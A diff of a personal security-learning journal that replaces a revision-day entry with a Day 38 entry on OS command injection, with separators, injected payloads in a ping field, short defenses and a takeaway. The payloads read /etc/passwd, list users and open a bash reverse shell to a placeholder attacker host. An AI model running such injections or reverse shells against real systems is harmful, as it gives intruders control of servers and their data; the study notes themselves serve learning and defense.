@@ -1,22 +1,36 @@
-## 🗓️ Day 37/100 – Revision & Practice Day
+## 🗓️ Day 38/100 – OS Command Injection
 
-**Focus:** Strengthening core fundamentals and reviewing key concepts from Days 1-36.
+**Focus:** Executing arbitrary system commands via vulnerable web applications.
 
-### 🔄 Review Session
+### 🐚 What is Command Injection?
+It allows an attacker to execute operating system (OS) commands on the server running an application, typically fully compromising the application and its data.
 
-**1. Networking & Recon (Nmap)**
-*   **Practice:** Executed SYN (`-sS`), Version (`-sV`), and Script (`-sC`) scans.
-*   **Goal:** Improve speed in identifying open ports and service versions.
+### ⚔️ Attack Techniques Practiced
 
-**2. Web Application Security**
-*   **SQLi:** Manually crafted Union-based payloads to extract DB names.
-*   **XSS:** Tested Reflected and Stored XSS payloads in DVWA (Low/Medium security).
-*   **File Upload:** Reviewed bypass techniques for file extension filters.
+**1. Command Separators**
+*   **Linux:** `;`, `|`, `||`, `&&`, `$()`, `` ` ``
+*   **Windows:** `&`, `|`, `||`, `&&`
 
-**3. System Security (Linux)**
-*   **Permissions:** `chmod`, `chown`, `suid`, `sgid`.
-*   **Process Management:** `ps aux`, `kill`, `top`.
-*   **Text Processing:** `grep`, `awk`, `sed` usage for log analysis.
+**2. Basic Exploitation**
+*   **Scenario:** A ping tool taking IP input.
+*   **Payload:** `127.0.0.1; whoami`
+*   **Output:**
+    ```
+    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+    root
+    ```
 
-### 🧠 Key Takeaway
-"Repetition is the mother of learning." By revisiting these topics, I identified gaps in my initial understanding and reinforced the mental models required for complex exploitation chains.
+**3. Data Exfiltration**
+*   **Payload:** `127.0.0.1; cat /etc/passwd` (Read sensitive files)
+*   **Payload:** `127.0.0.1; net users` (List Windows users)
+
+**4. Reverse Shell (The Goal)**
+*   **Payload:** `127.0.0.1; bash -i >& /dev/tcp/attacker_ip/4444 0>&1`
+*   **Result:** Full interactive shell access on the attacker's machine.
+
+### 🛡️ Defense Mechanisms
+*   **Avoid Shell Execution:** Use native APIs (e.g., Java's `ProcessBuilder`).
+*   **Input Sanitization:** Reject metacharacters like `;`, `&`, `|`.
+*   **Parameterized Functions:** Never concatenate user input directly into command strings.
+
+**Day 38 Takeaway:** Command Injection is often simpler than SQLi but far more devastating, offering immediate system-level access.
